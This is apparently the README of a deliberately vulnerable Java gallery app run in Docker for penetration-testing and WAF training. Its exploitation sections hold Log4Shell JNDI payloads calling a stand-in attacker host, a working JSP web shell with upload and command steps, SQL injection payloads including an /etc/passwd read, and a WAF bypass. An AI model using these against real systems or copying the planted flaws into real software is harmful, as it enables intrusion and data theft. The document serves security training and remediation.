# Vulnerable Web Application - Security Training Environment

A deliberately vulnerable Java-based web application designed for penetration testing training, security research, and Web Application Firewall (WAF) testing. This project demonstrates common web vulnerabilities in a controlled Docker environment.

> **⚠️ WARNING**: This application contains real security vulnerabilities. Use only in isolated environments for educational purposes. Never deploy on production networks or expose to the internet.

## Overview

This project implements a simple image gallery application with multiple intentional security flaws, protected by an NGINX reverse proxy with ModSecurity WAF. It's designed to help security professionals understand vulnerability exploitation and defense mechanisms.

**Key Features:**
- Multiple OWASP Top 10 vulnerabilities
- ModSecurity WAF with OWASP Core Rule Set
- Docker-based deployment for easy setup
- Realistic vulnerability scenarios
- Customizable security controls

## System Architecture

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          Docker Network (app-net)                        │
│                                                                          │
│  ┌──────────────┐      HTTPS/443      ┌────────────────────────────┐   │
│  │   Internet   │ ──────────────────► │  NGINX Reverse Proxy       │   │
│  │   Client     │                      │  + ModSecurity WAF         │   │
│  └──────────────┘ ◄──────────────────  │  + SSL/TLS Termination     │   │
│         │                               └─────────────┬──────────────┘   │
│         │ HTTP/80 (auto redirect)                    │                  │
│         └─────────────────────────────────────────────┘                  │
│                                                        │                  │
│                                          HTTP/8080    │                  │
│                                     (Internal only)   │                  │
│                                                        ▼                  │
│                                         ┌──────────────────────────┐     │
│                                         │  Java Web Application    │     │
│                                         │  - Apache Tomcat 8.5.93  │     │
│                                         │  - JDK 8u121             │     │
│                                         │  - Servlet Controllers   │     │
│                                         │  - Velocity Templates    │     │
│                                         │  - Log4j 2.14.1 (vuln)   │     │
│                                         └──────────────┬───────────┘     │
│                                                        │                  │
│                                            JDBC        │                  │
│                                     (MySQL Connector)  │                  │
│                                                        ▼                  │
│                                         ┌──────────────────────────┐     │
│                                         │  MySQL Database 8.0      │     │
│                                         │  - Database: pentest_final│    │
│                                         │  - Table: imgs           │     │
│                                         │  - User: linh            │     │
│                                         └──────────────────────────┘     │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────────────┐
│                           Volume Mappings                               │
├────────────────────────────────────────────────────────────────────────┤
│  Host Path                         →  Container Path                   │
├────────────────────────────────────────────────────────────────────────┤
│  ./Nginx/default.conf              →  /etc/nginx/templates/...         │
│  ./Nginx/ssl/                      →  /etc/nginx/ssl/                  │
│  ./Nginx/logs/modsecurity/         →  /var/log/modsecurity/            │
│  ./Nginx/logs/nginx/               →  /var/log/nginx/                  │
│  ./Nginx/custom/*.conf             →  /etc/modsecurity.d/owasp-crs/... │
└────────────────────────────────────────────────────────────────────────┘
```

### Request Flow

```
1. Client Request (HTTPS)
   ↓
2. NGINX SSL Termination
   ↓
3. ModSecurity WAF Inspection
   ├─ [BLOCKED] → 403 Forbidden
   └─ [ALLOWED] → Continue
        ↓
4. Reverse Proxy to App (HTTP)
   ↓
5. Tomcat Servlet Processing
   ├─ Index.java (Gallery)
   ├─ Upload.java (File Upload)
   └─ VelocityHelper (Template Rendering)
        ↓
6. Database Query (if needed)
   ↓
7. Response Generation
   ↓
8. Return to Client (HTTPS)
```

### Components

| Service | Technology | Port | Purpose | Image |
|---------|-----------|------|---------|-------|
| **nginx** | NGINX + ModSecurity CRS 3.x | 80, 443 | Reverse proxy with WAF protection | `melp007/cd3_nginx:latest` |
| **app** | Java 8 + Tomcat 8.5.93 | 8080 | Vulnerable web application | `melp007/cd3_app:latest` |
| **mysql** | MySQL 8.0 | 3306 | Database backend | `melp007/cd3_mysql:latest` |

### Technology Stack

```
┌─────────────────────────────────────────────────────────────────┐
│                        Frontend Layer                            │
├─────────────────────────────────────────────────────────────────┤
│  • Velocity Template Engine 1.7                                 │
│  • HTML5 + CSS3                                                  │
│  • JavaScript (Vanilla)                                          │
│  • Font Awesome Icons 6.5.0                                      │
│  • Google Fonts (Inter)                                          │
└─────────────────────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────────────────────┐
│                     Application Layer                            │
├─────────────────────────────────────────────────────────────────┤
│  • Java 8 (JDK 8u121)                                           │
│  • Apache Tomcat 8.5.93                                          │
│  • Java Servlet API 4.0.1                                        │
│  • Apache Log4j 2.14.1 (Vulnerable)                             │
│  • Maven 3.8.6 (Build Tool)                                      │
└─────────────────────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────────────────────┐
│                      Database Layer                              │
├─────────────────────────────────────────────────────────────────┤
│  • MySQL 8.0                                                     │
│  • MySQL Connector/J 8.0.33                                      │
│  • Character Set: utf8mb4                                        │
└─────────────────────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────────────────────┐
│                    Infrastructure Layer                          │
├─────────────────────────────────────────────────────────────────┤
│  • Docker Engine 20.10+                                          │
│  • Docker Compose 2.0+                                           │
│  • Ubuntu 22.04 (Base Image)                                     │
└─────────────────────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────────────────────┐
│                      Security Layer                              │
├─────────────────────────────────────────────────────────────────┤
│  • NGINX (Reverse Proxy)                                         │
│  • ModSecurity 3.x (WAF Engine)                                  │
│  • OWASP CRS 3.x (Rule Set)                                      │
│  • libmagic (File Type Detection)                                │
│  • OpenSSL (TLS/SSL)                                             │
└─────────────────────────────────────────────────────────────────┘
```

## Quick Start

### Prerequisites

- Docker Engine 20.10 or higher
- Docker Compose 2.0 or higher
- At least 2GB available RAM

### Installation

```bash
# Clone the repository
git clone https://github.com/dangducloc/cd3.git
cd cd3

# Start all services
docker-compose up --build -d

# Verify services are running
docker-compose ps
```

### Access Points

- **Main Application**: https://localhost
- **HTTP Redirect**: http://localhost (automatically redirects to HTTPS)
- **Direct App Access**: http://localhost:8080 (bypasses WAF)

> **Note**: The application uses a self-signed SSL certificate. Accept the security warning in your browser.

## Project Structure

### Complete Directory Tree

```
dangducloc-cd3/
│
├── 📄 docker-compose.yml              # Docker orchestration configuration
├── 📄 README.md                        # This documentation file
│
├── 📁 Data/                            # MySQL Database Configuration
│   ├── 📄 dockerfile                   # MySQL 8.0 container build
│   └── 📄 init.sql                     # Database initialization script
│                                         • Creates 'pentest_final' database
│                                         • Creates 'imgs' table
│                                         • Inserts 12 sample image records
│
├── 📁 Gallery/                         # Main Java Application
│   ├── 📄 dockerfile                   # Multi-stage application build
│   │                                     • Stage 1: Maven builder (compile WAR)
│   │                                     • Stage 2: Tomcat runtime
│   ├── 📄 pom.xml                      # Maven project configuration
│   │                                     • Dependencies (Log4j, MySQL, Velocity)
│   │                                     • ⚠️ Includes vulnerable Log4j 2.14.1
│   │
│   ├── 📁 extra/                       # Build dependencies (not in repo tree)
│   │   ├── jdk-8u121-linux-x64.tar.gz
│   │   └── apache-tomcat-8.5.93.tar.gz
│   │
│   └── 📁 src/
│       └── 📁 main/
│           ├── 📁 java/                # Java source code
│           │   │
│           │   ├── 📁 Controller/      # Servlet Controllers
│           │   │   ├── 📄 Index.java
│           │   │   │   • Handles GET /
│           │   │   │   • Displays gallery with search
│           │   │   │   • ⚠️ Logs search queries (Log4Shell entry point)
│           │   │   │
│           │   │   ├── 📄 Upload.java
│           │   │   │   • Handles GET/POST /upload
│           │   │   │   • File upload with MD5 hashing
│           │   │   │   • ⚠️ Allows .jsp extension (RCE vulnerability)
│           │   │   │   • ⚠️ Weak content-type validation
│           │   │   │
│           │   │   └── 📄 VelocityHelper.java
│           │   │       • Velocity template engine wrapper
│           │   │       • Loads templates from WEB-INF/templates/
│           │   │
│           │   ├── 📁 Model/           # Data Models
│           │   │   └── 📄 Img.java
│           │   │       • Image entity POJO
│           │   │       • Fields: id, name_by_user, name_on_server
│           │   │
│           │   └── 📁 Utils/           # Database Utilities
│           │       ├── 📄 DB_handler.java
│           │       │   • JDBC connection factory
│           │       │   • Reads DB credentials from environment
│           │       │
│           │       └── 📄 Pool.java
│           │           • Database query methods
│           │           • getAllImages() - Fetch all records
│           │           • insertImageWithCustomName() - Add new image
│           │           • ⚠️ searchImages() - SQL Injection vulnerability
│           │
│           ├── 📁 resources/           # Application Resources
│           │   └── 📄 log4j2.xml       # Log4j configuration
│           │       • Console appender
│           │       • File appender (logs/vulnapp.log)
│           │       • INFO level logging
│           │
│           └── 📁 webapp/              # Web Application Root
│               ├── 📄 linh.jsp         # Test JSP file
│               │   • Simple test page with image display
│               │
│               ├── 📁 imgs/            # Uploaded Images Storage
│               │   └── [MD5_hash]_[timestamp].[ext]
│               │       • Stores all uploaded files
│               │       • ⚠️ JSP files executed if uploaded
│               │
│               └── 📁 WEB-INF/         # Protected Configuration
│                   ├── 📄 web.xml      # Servlet configuration
│                   │   • Servlet mappings
│                   │   • Static resource handling (/imgs/*)
│                   │
│                   └── 📁 templates/   # Velocity Templates
│                       ├── 📄 index.vm
│                       │   • Gallery listing page
│                       │   • Masonry grid layout
│                       │   • Search functionality
│                       │   • Lightbox image viewer
│                       │
│                       └── 📄 upload.vm
│                           • File upload form
│                           • Drag & drop interface
│                           • Custom image naming
│                           • File validation (client-side)
│
└── 📁 Nginx/                           # Reverse Proxy + WAF
    ├── 📄 Dockerfile                   # NGINX + ModSecurity build
    │   • Base: owasp/modsecurity-crs:nginx-alpine
    │   • Installs libmagic for file type detection
    │
    ├── 📄 default.conf                 # NGINX server configuration
    │   • HTTP → HTTPS redirect (port 80)
    │   • HTTPS server (port 443)
    │   • SSL/TLS configuration
    │   • Reverse proxy to app:8080
    │   • WebSocket support
    │   • ModSecurity integration
    │
    ├── 📁 ssl/                         # SSL Certificates
    │   ├── 📄 cert.pem                 # Self-signed certificate
    │   └── 📄 key.pem                  # Private key
    │       • Valid for: localhost
    │       • Expires: 2026-02-06
    │
    ├── 📁 custom/                      # Custom ModSecurity Rules
    │   └── 📄 REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf
    │       • Enables request body inspection
    │       • Disables false-positive rules for /upload
    │       • ⚠️ Blocks dangerous extensions (.php, .exe, etc.)
    │       • ✅ Allows image extensions + .jsp (intentional)
    │       • Validates file content with magic bytes
    │       • Enforces 10MB size limit
    │
    └── 📁 logs/                        # Log directories (created at runtime)
        ├── 📁 modsecurity/
        │   └── audit.log               # WAF audit logs (JSON format)
        └── 📁 nginx/
            ├── access.log              # HTTP access logs
            └── error.log               # NGINX error logs
```

### File Dependency Graph

```
┌─────────────────────────────────────────────────────────────────┐
│                      Build Dependencies                          │
└─────────────────────────────────────────────────────────────────┘
                              ↓
              ┌───────────────────────────────┐
              │      docker-compose.yml       │
              │  (Orchestrates all services)  │
              └───────────────┬───────────────┘
                              ↓
        ┌─────────────────────┼─────────────────────┐
        ↓                     ↓                     ↓
┌───────────────┐    ┌────────────────┐    ┌──────────────┐
│ Nginx/        │    │ Gallery/       │    │ Data/        │
│ Dockerfile    │    │ dockerfile     │    │ dockerfile   │
└───────┬───────┘    └───────┬────────┘    └──────┬───────┘
        │                    │                     │
        ↓                    ↓                     ↓
┌───────────────┐    ┌────────────────┐    ┌──────────────┐
│ default.conf  │    │ pom.xml        │    │ init.sql     │
│ ssl/*         │    │ (downloads deps)│    │              │
│ custom/*.conf │    └───────┬────────┘    └──────────────┘
└───────────────┘            │
                             ↓
                    ┌─────────────────┐
                    │ src/main/java/* │
                    │ src/main/webapp/*│
                    └─────────┬───────┘
                              ↓
                    ┌─────────────────┐
                    │  Gallery.war    │
                    │  (Deployed)     │
                    └─────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                      Runtime Dependencies                        │
└─────────────────────────────────────────────────────────────────┘

    Client Request
         ↓
    [NGINX: default.conf]
         ↓
    [ModSecurity: custom/*.conf]
         ↓
    [Tomcat: Gallery.war]
         ↓
    [Servlets: Controller/*.java]
         ↓
    [Database: Utils/Pool.java]
         ↓
    [MySQL: init.sql schema]
```

### Key Configuration Files

#### 1. docker-compose.yml
```yaml
Purpose: Container orchestration
Services: nginx, app, mysql
Network: app-net (bridge)
Volumes: Configuration, logs, SSL certificates
```

#### 2. Gallery/pom.xml
```xml
Purpose: Maven project definition
Key Dependencies:
  - javax.servlet-api 4.0.1
  - mysql-connector-java 8.0.33
  - log4j-api 2.14.1 (vulnerable)
  - log4j-core 2.14.1 (vulnerable)
  - velocity 1.7
Build: Creates Gallery.war
```

#### 3. Nginx/default.conf
```nginx
Purpose: Reverse proxy configuration
Features:
  - HTTP to HTTPS redirect
  - SSL/TLS termination
  - Proxy pass to app:8080
  - ModSecurity integration
  - WebSocket support
```

#### 4. Nginx/custom/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf
```
Purpose: Custom WAF rules
Rules:
  - 900000: Allow multipart/form-data
  - 900001: Disable false positives for /upload
  - 900002: Block dangerous extensions
  - 900003: Whitelist image extensions
  - 900004: Validate magic bytes
  - 900005: Enforce size limit
```

#### 5. Data/init.sql
```sql
Purpose: Database initialization
Actions:
  - Create database: pentest_final
  - Create table: imgs (id, name_by_user, name_on_server)
  - Insert 12 sample records
  - Set AUTO_INCREMENT to 13
```

### Source Code Structure

#### Controller Layer
```
Index.java
  ├─ Handles: GET /
  ├─ Function: Display gallery with search
  ├─ Vulnerable: Log4Shell via logger.info()
  └─ Template: index.vm

Upload.java
  ├─ Handles: GET/POST /upload
  ├─ Function: File upload with MD5 naming
  ├─ Vulnerable: Allows .jsp extension, weak validation
  └─ Template: upload.vm
```

#### Model Layer
```
Img.java
  ├─ Properties: id, name_by_user, name_on_server
  ├─ Constructor: Full constructor
  └─ Getters: getId(), getName_by_user(), getName_on_server()
```

#### Database Layer
```
DB_handler.java
  ├─ Method: getConnection()
  ├─ Reads: Environment variables (DB_URL, DB_USER, DB_PASSWORD)
  └─ Returns: JDBC Connection

Pool.java
  ├─ Method: getAllImages()
  │   └─ Returns: ArrayList<Img> (all records)
  ├─ Method: insertImageWithCustomName()
  │   └─ Inserts: New image record (prepared statement)
  └─ Method: searchImages()
      ├─ Vulnerable: SQL injection via string concatenation
      └─ Returns: ArrayList<Img> (filtered records)
```

### Template Structure

#### index.vm (Gallery Page)
```
Layout:
  ├─ Header: Title + Upload button
  ├─ Search Form: GET parameter 'search'
  ├─ Masonry Grid: 4 columns (responsive)
  │   └─ Cards: Image + Caption
  └─ Lightbox: Full-size image viewer

Features:
  - Lazy loading with skeleton animation
  - Hover effects (scale + shadow)
  - Keyboard navigation (ESC to close)
  - Mobile responsive (1-4 columns)
```

#### upload.vm (Upload Page)
```
Layout:
  ├─ Header: Title + Back to Gallery link
  ├─ Messages: Success/Error notifications
  ├─ Upload Form:
  │   ├─ Drop Zone: Drag & drop area
  │   ├─ File Input: Hidden input (image/*)
  │   ├─ Custom Name: Text input (required)
  │   └─ Submit Button: Upload trigger
  └─ JavaScript: Client-side validation

Features:
  - Drag & drop support
  - File type validation (client-side only)
  - Size limit check (10MB)
  - Real-time feedback
  - URL parameter error handling
```

## Vulnerabilities

### 1. Log4Shell (CVE-2021-44228) ⚠️ **Critical**

**Description**: Remote Code Execution via JNDI injection in Apache Log4j 2.14.1

**Location**: 
- Dependency: `Gallery/pom.xml` (Log4j 2.14.1)
- Trigger: `Gallery/src/main/java/Controller/Index.java`

**Exploitation**:
```bash
# JNDI injection via search parameter
curl -k "https://localhost/?search=\${jndi:ldap://attacker.com:1389/Exploit}"

# Example with local LDAP server
curl -k "https://localhost/?search=\${jndi:ldap://192.168.1.100:1389/obj}"
```

**Impact**: Full server compromise, remote code execution

### 2. Unrestricted File Upload → RCE ⚠️ **Critical**

**Description**: Application allows upload of `.jsp` files which are then executed by Tomcat

**Location**: `Gallery/src/main/java/Controller/Upload.java`

**Vulnerable Code**:
```java
// Line 71-74: JSP files explicitly allowed
if (!ext.equals(".jpg") && !ext.equals(".jpeg") && !ext.equals(".png") &&
    !ext.equals(".gif") && !ext.equals(".webp") && !ext.equals(".jsp")) {
    // Reject file
}
```

**Exploitation**:
```bash
# Create malicious JSP webshell
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
    }
%>
EOF

# Upload via curl (bypassing WAF on port 8080)
curl -k -X POST \
  -F "image=@shell.jsp" \
  -F "customName=backdoor" \
  http://localhost:8080/upload

# Execute commands
curl -k "http://localhost:8080/imgs/[hash]_[timestamp].jsp?cmd=whoami"
```

**Impact**: Remote code execution, server takeover

### 3. SQL Injection ⚠️ **High**

**Description**: Unsanitized user input in SQL queries allows database manipulation

**Location**: `Gallery/src/main/java/Utils/Pool.java`

**Vulnerable Code**:
```java
// Line 33: Direct string concatenation in SQL query
public ArrayList<Img> searchImages(String query) throws SQLException {
    String sql = "SELECT * FROM imgs WHERE name_by_user LIKE "+"'%" + query + "%'";
    ResultSet raw_data = getConnection().prepareStatement(sql).executeQuery();
    // ...
}
```

**Exploitation**:
```bash
# Basic authentication bypass
curl -k "https://localhost/?search=' OR '1'='1"

# Union-based injection to extract data
curl -k "https://localhost/?search=' UNION SELECT 1,user(),version()--"

# Time-based blind SQLi
curl -k "https://localhost/?search=' AND SLEEP(5)--"
```

**Impact**: Data exfiltration, authentication bypass, database compromise

### 4. Missing Authentication & Authorization

**Description**: No authentication required for any functionality

**Location**: All endpoints

**Impact**: Anyone can upload files, view all images, search database

### 5. Insecure Direct Object References (IDOR)

**Description**: Predictable image paths allow accessing any uploaded file

**Exploitation**:
```bash
# Enumerate uploaded files
for i in {1..100}; do
  curl -k "https://localhost/imgs/[hash]_$i.jpg" -o "img_$i.jpg"
done
```

## Security Controls (WAF)

### ModSecurity Configuration

The application is protected by ModSecurity with OWASP Core Rule Set (CRS). Configuration can be adjusted via environment variables:

```yaml
environment:
  - PARANOIA=1              # Paranoia level (1-4, higher = stricter)
  - ANOMALY_INBOUND=5       # Anomaly score threshold
  - SEC_RULE_ENGINE=On      # Enable/disable ModSecurity
  - AUDIT_ENGINE=RelevantOnly
  - AUDIT_LOG_FORMAT=JSON
```

### Custom WAF Rules

Location: `Nginx/custom/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf`

**Active Protections**:
1. **Dangerous Extension Blocking**: Blocks `.php`, `.asp`, `.exe`, `.dll`, etc.
2. **Image Whitelist**: Only allows `.jpg`, `.jpeg`, `.png`, `.gif`, `.webp`, `.bmp`
3. **Magic Byte Validation**: Verifies file content using libmagic
4. **Size Limit**: Maximum 10MB per upload
5. **Exclusion Rules**: Disables false positives for legitimate traffic

**Note**: These rules are intentionally weakened for training purposes. The `.jsp` extension bypass demonstrates WAF evasion techniques.

### SSL/TLS Configuration

- **Protocol**: TLS 1.2 and 1.3 only
- **Certificate**: Self-signed (for development only)
- **HTTP → HTTPS**: Automatic redirect
- **Headers**: HSTS, X-Content-Type-Options, X-Frame-Options

## Testing Scenarios

### Scenario 1: Log4Shell Exploitation

```bash
# Setup LDAP server (attacker machine)
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://attacker.com:8000/#Exploit"

# Setup HTTP server with malicious class
python3 -m http.server 8000

# Trigger vulnerability
curl -k "https://localhost/?search=\${jndi:ldap://attacker.com:1389/Exploit}"
```

### Scenario 2: WAF Bypass + File Upload

```bash
# Test WAF blocking (should fail)
curl -k -X POST \
  -F "image=@shell.php" \
  -F "customName=test" \
  https://localhost/upload

# Bypass WAF using .jsp extension
curl -k -X POST \
  -F "image=@shell.jsp" \
  -F "customName=backdoor" \
  http://localhost:8080/upload

# Access uploaded shell
curl -k "http://localhost:8080/imgs/[filename].jsp?cmd=id"
```

### Scenario 3: SQL Injection → Data Dump

```bash
# Enumerate table structure
curl -k "https://localhost/?search=' UNION SELECT 1,table_name,3 FROM information_schema.tables--"

# Extract all image names
curl -k "https://localhost/?search=' UNION SELECT id,name_by_user,name_on_server FROM imgs--"

# Read system files (if permissions allow)
curl -k "https://localhost/?search=' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--"
```

### Scenario 4: WAF Testing & Tuning

```bash
# Test anomaly scoring
curl -k "https://localhost/?search=<script>alert(1)</script>"

# Test SQL injection detection
curl -k "https://localhost/?search=' OR 1=1--"

# Test file upload validation
curl -k -X POST \
  -F "image=@malicious.exe" \
  https://localhost/upload

# Review ModSecurity logs
docker-compose logs nginx | grep -i "modsecurity"
```

## Environment Variables

### NGINX Service
```yaml
TZ: Asia/Ho_Chi_Minh         # Timezone
BACKEND: http://app:8080     # Backend application URL
PARANOIA: 1                  # ModSecurity paranoia level (1-4)
ANOMALY_INBOUND: 5           # Inbound anomaly score threshold
SEC_RULE_ENGINE: On          # Enable/disable ModSecurity
AUDIT_ENGINE: RelevantOnly   # Log only blocked requests
AUDIT_LOG_FORMAT: JSON       # Audit log format
```

### Application Service
```yaml
DB_URL: jdbc:mysql://mysql:3306/pentest_final
DB_USER: linh
DB_PASSWORD: linh
TZ: Asia/Ho_Chi_Minh
```

### MySQL Service
```yaml
MYSQL_DATABASE: pentest_final
MYSQL_USER: linh
MYSQL_PASSWORD: linh
MYSQL_ROOT_PASSWORD: linh
TZ: Asia/Ho_Chi_Minh
```

## Database Schema

```sql
CREATE TABLE `imgs` (
    `id` INT NOT NULL AUTO_INCREMENT,
    `name_by_user` TEXT NOT NULL,
    `name_on_server` TEXT NOT NULL,
    PRIMARY KEY (`id`),
    UNIQUE KEY `name_on_server` (`name_on_server`(255))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

**Sample Data**: 12 pre-populated image records (ID 1-12)

## Logging & Monitoring

### ModSecurity Audit Logs
```bash
# Location: Nginx/logs/modsecurity/
docker-compose exec nginx tail -f /var/log/modsecurity/audit.log

# Parse JSON logs
cat Nginx/logs/modsecurity/audit.log | jq '.transaction.messages'
```

### NGINX Access Logs
```bash
# Location: Nginx/logs/nginx/
docker-compose exec nginx tail -f /var/log/nginx/access.log
```

### Application Logs
```bash
# View application logs
docker-compose logs -f app

# Container internal logs
docker-compose exec app tail -f logs/vulnapp.log
```

## Maintenance Commands

### Service Management
```bash
# Start services
docker-compose up -d

# Stop services
docker-compose down

# Restart single service
docker-compose restart app

# Rebuild after code changes
docker-compose up --build -d
```

### Database Operations
```bash
# Access MySQL shell
docker-compose exec mysql mysql -u linh -plinh pentest_final

# Backup database
docker-compose exec mysql mysqldump -u linh -plinh pentest_final > backup.sql

# Restore database
docker-compose exec -T mysql mysql -u linh -plinh pentest_final < backup.sql
```

### Clean Up
```bash
# Remove all containers and volumes
docker-compose down -v

# Remove all images
docker-compose down --rmi all

# Clean uploaded files
rm -rf Gallery/src/main/webapp/imgs/*
```

### Health Checks
```bash
# Check all services
docker-compose ps

# Test application
curl -k https://localhost

# Test database connection
docker-compose exec app nc -zv mysql 3306

# Check ModSecurity status
curl -k https://localhost/nginx_status
```

## Troubleshooting

### Application won't start
```bash
# Check logs
docker-compose logs app

# Verify Java version
docker-compose exec app java -version

# Check database connectivity
docker-compose exec app ping mysql
```

### WAF blocking legitimate traffic
```bash
# Temporarily disable ModSecurity
docker-compose exec nginx sed -i 's/SecRuleEngine On/SecRuleEngine DetectionOnly/' /etc/modsecurity.d/modsecurity.conf
docker-compose restart nginx

# Adjust paranoia level
# Edit docker-compose.yml: PARANOIA=1 (lower = more permissive)
```

### Database connection errors
```bash
# Verify MySQL is running
docker-compose ps mysql

# Check credentials
docker-compose exec mysql mysql -u linh -plinh -e "SHOW DATABASES;"

# Reinitialize database
docker-compose down -v
docker-compose up -d mysql
```

## Security Best Practices (For Defenders)

This vulnerable application demonstrates what NOT to do. Here's how to fix these issues:

### 1. Remediate Log4Shell
```xml
<!-- Update pom.xml -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>  <!-- or latest -->
</dependency>
```

### 2. Secure File Upload
```java
// Whitelist validation
private static final Set<String> ALLOWED_TYPES = Set.of("image/jpeg", "image/png", "image/gif");

// Validate Content-Type
String contentType = filePart.getContentType();
if (!ALLOWED_TYPES.contains(contentType)) {
    throw new SecurityException("Invalid file type");
}

// Validate magic bytes
byte[] header = new byte[8];
inputStream.read(header);
if (!isValidImageHeader(header)) {
    throw new SecurityException("Invalid image file");
}

// Store outside webroot
Path uploadDir = Paths.get("/var/uploads/");  // Outside webapp
```

### 3. Fix SQL Injection
```java
// Use PreparedStatement
public ArrayList<Img> searchImages(String query) throws SQLException {
    String sql = "SELECT * FROM imgs WHERE name_by_user LIKE ?";
    PreparedStatement stmt = getConnection().prepareStatement(sql);
    stmt.setString(1, "%" + query + "%");
    ResultSet rs = stmt.executeQuery();
    // ...
}
```

### 4. Add Authentication
```java
// Use Spring Security or implement session management
@WebFilter("/*")
public class AuthenticationFilter implements Filter {
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
        HttpSession session = ((HttpServletRequest) request).getSession(false);
        if (session == null || session.getAttribute("user") == null) {
            ((HttpServletResponse) response).sendRedirect("/login");
            return;
        }
        chain.doFilter(request, response);
    }
}
```

## Educational Resources

### Related OWASP Projects
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [ModSecurity Core Rule Set](https://coreruleset.org/)
- [WebGoat](https://owasp.org/www-project-webgoat/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

### CVE References
- [CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [CWE-434: Unrestricted Upload](https://cwe.mitre.org/data/definitions/434.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

### Learning Paths
1. Start with SQL injection in search functionality
2. Bypass WAF to upload JSP shell
3. Attempt Log4Shell exploitation
4. Tune ModSecurity rules to block attacks
5. Implement proper remediation

## Legal & Ethical Notice

⚠️ **IMPORTANT**: This software is provided for educational and authorized testing purposes only.

- **DO NOT** deploy on public networks
- **DO NOT** use against systems you don't own
- **DO NOT** use for malicious purposes
- **DO** use in isolated lab environments
- **DO** obtain proper authorization before testing
- **DO** follow responsible disclosure practices

Unauthorized access to computer systems is illegal. Users are responsible for compliance with applicable laws.

## Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Test your changes thoroughly
4. Submit a pull request with clear description

## License

This project is provided as-is for educational purposes. See LICENSE file for details.

## Credits

- **Maintainer**: dangducloc
- **Docker Images**: melp007/cd3_*
- **Base Images**: 
  - OWASP ModSecurity CRS (nginx-alpine)
  - MySQL 8.0
  - Maven 3.8.6 + OpenJDK 8

## Changelog

### Version 1.0 (Current)
- Initial release
- Log4Shell vulnerability (CVE-2021-44228)
- Unrestricted file upload with JSP execution
- SQL injection in search functionality
- ModSecurity WAF with custom rules
- Docker-based deployment
- Pre-populated sample database

---

**Last Updated**: December 2025  
**Repository**: https://github.com/dangducloc/cd3  
**Issues**: https://github.com/dangducloc/cd3/issues